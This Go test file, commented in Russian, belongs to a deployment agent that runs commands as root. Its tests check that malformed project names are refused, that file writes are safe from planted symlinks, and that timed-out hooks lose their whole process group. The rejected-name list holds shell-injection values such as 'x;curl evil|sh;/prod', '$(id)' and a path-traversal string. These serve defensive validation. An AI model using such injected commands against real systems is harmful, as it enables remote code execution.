package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Имя проекта уходит в путь файла и в команду, которую агент выполняет от
// root: имя не в форме панели не принимается ни из командной строки, ни от нее.
func TestForeignNamesAreRefused(t *testing.T) {
	for _, good := range []string{"shop/prod", "globex/shop/prod", "a/b", "my-app/stage-2"} {
		if _, err := parseTarget(good); err != nil {
			t.Fatalf("%s: %v", good, err)
		}
	}
	for _, bad := range []string{
		"x;curl evil|sh;/prod",
		"$(id)/prod",
		"../etc/prod",
		"shop/prod`id`",
		"Shop/prod",
		"shop /prod",
		"-shop/prod",
		"g;id/shop/prod",
	} {
		if _, err := parseTarget(bad); err == nil {
			t.Fatalf("%q принято", bad)
		}
	}
}

// Ссылка, подложенная заранее под имя временного файла, не уводит запись: имя
// временного файла случайное, и создается он только новым.
func TestWriteFileIgnoresPlantedLinks(t *testing.T) {
	dir := t.TempDir()
	victim := filepath.Join(dir, "victim")
	if err := os.WriteFile(victim, []byte("keep"), 0o644); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(dir, "app.env")
	if err := os.Symlink(victim, target+".tmp"); err != nil {
		t.Fatal(err)
	}
	if err := writeFile(target, "A=1\n", 0o440); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.ReadFile(victim); string(got) != "keep" {
		t.Fatalf("запись ушла по ссылке: %q", got)
	}
	info, err := os.Stat(target)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o440 {
		t.Fatalf("права %o", info.Mode().Perm())
	}
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") && e.Name() != "app.env.tmp" {
			t.Fatalf("остался временный файл %s", e.Name())
		}
	}
}

// Зависшая команда после изменения не останавливает агента навсегда: по
// истечении времени снимается вся ее группа процессов.
func TestHookTimeoutStopsTheWholeGroup(t *testing.T) {
	saved := hookTimeout
	hookTimeout = 300 * time.Millisecond
	defer func() { hookTimeout = saved }()
	marker := filepath.Join(t.TempDir(), "late")
	start := time.Now()
	runHook(context.Background(), "sleep 2 && touch "+marker+" & wait")
	if took := time.Since(start); took > 1500*time.Millisecond {
		t.Fatalf("ждал %s", took)
	}
	time.Sleep(2500 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("потомок команды пережил остановку")
	}
}
